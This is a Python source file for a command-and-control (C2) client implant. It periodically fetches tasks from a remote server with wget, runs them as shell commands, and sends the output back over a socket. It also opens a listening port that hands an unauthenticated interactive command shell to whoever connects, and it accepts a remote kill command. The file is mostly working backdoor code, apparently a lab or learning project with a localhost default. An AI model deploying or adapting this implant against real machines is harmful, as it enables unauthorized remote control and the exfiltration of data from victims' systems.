import socket
import time
import os.path
import capabilities

class Client:
    """
    A class to represent a Commaand & Control (C2) Client

    Attributes
    ----------

    ADDR : str
        String representation of the desired interface to listen on
    COMMS_PORT : int
        Integer representation of the desired port number to listen on
    SERVER : str
        String representation of the remote server IP address : "127.0.0.1"
    SRV_PORT : int
        Integer representation of the remote server port number
    WEB_PORT : int (Optional)
        Optional integer representation of the remote server web port 
        Defaults to TCP/8000
    MAX_TIMER : int (Optional)
        Optional integer representation of the connection frequency.
        After MAX_TIMER seconds, the client will initiate a connection to
        the server to check for tasking.
        Defaults to 120 seconds (2 minutes)

    Methods
    -------

    check_tasking()
    Parameters
    ----------
    None.
    Client issues a web request to server checking for tasking and writes it out to a file

    comms_thread()
    Parameters
    ----------
    None.
    Client listens and accepts connections on self.PORT for shell connectivity.
    Client executes tasked commands.

    exec_tasking()
    Parameters
    ----------
    None.
    Client reads the stored tasks and executes them, writing the results to a file

    send_results()
    Parameters
    ----------
    None.
    Client connects to remote C2 Server and sends stored task results

    tasking_thread()
    Parameters
    ----------
    None.
    Client executes the following loop:
     - Check Tasking
     - Execute Tasking
     - Send Results
    Following this, the client sleeps for MAX_TIMER seconds
    """

    def __init__(self,ADDR,COMMS_PORT,SERVER,SRV_PORT,WEB_PORT=8000,MAX_TIMER=120):
        self.ADDR = ADDR
        self.COMMS_PORT = COMMS_PORT
        self.MAX_TIMER = MAX_TIMER
        self.SERVER = SERVER
        self.SRV_PORT = SRV_PORT
        self.WEB_PORT = WEB_PORT
    
    def check_tasking(self):
        task_file_command = f"wget http://{self.SERVER}:{self.WEB_PORT}/tasks.txt -O ./tasks-grabbed.txt"
        capabilities.run(task_file_command)
    
    def comms_thread(self):
        COMMS = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        COMMS.bind((self.ADDR,self.COMMS_PORT))
        COMMS.listen()
        while True:
            COMX,COMX_ADDR = COMMS.accept()
            task = COMX.recv(1024)
            print(f"Received C2: {task.decode()}")
            if "TASK" in task.decode().upper():
                COMX.send(b"Enter your command (QUIT to exit shell): ")
                run_me = COMX.recv(1024)
                while(run_me.decode().upper() != "QUIT"):
                    output = capabilities.run(run_me.decode())
                    send_str = f"--> {output}"                
                    COMX.send(send_str.encode())
                    
                    task = COMX.recv(1024)
                    COMX.send(b"Enter your command: ")
                    run_me = COMX.recv(1024)
            elif "KILL" in task.decode().upper():
                COMX.send(b"KILL RECV'D. KILLING NOW")
                import os
                os.kill(os.getpid(),9)    
            else:
                COMX.send((f"I'm not familiar with the task {task.decode().upper()}").encode())
    
            COMX.close()
    
    def exec_tasking(self):
        tasking_fh = open("./tasks-grabbed.txt",'r')
        for line in tasking_fh.readlines():
            if os.path.exists("results.txt"):
                fh_out = open("results.txt",'a')
            else:
                fh_out = open("results.txt",'w')
            fh_out.write(f"---------- {line.strip()} ----------\n")
            output = capabilities.run(line.strip())
            fh_out.write(output)
            fh_out.close()
    
    def send_results(self):
        CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        CLIENT.connect((self.SERVER,self.SRV_PORT))
    
        fh = open("results.txt",'r')
        for line in fh.readlines():
            CLIENT.send(line.encode())
        fh.close()
        CLIENT.close()
    
    def tasking_thread(self):
        while True:
            sleep_timer = self.MAX_TIMER   
            self.check_tasking()
            self.exec_tasking()
            self.send_results()
            print(f"Checking for tasks in {self.MAX_TIMER//60} minutes...")
            while sleep_timer > 0:
                sleep_timer-=1
                time.sleep(1)
    
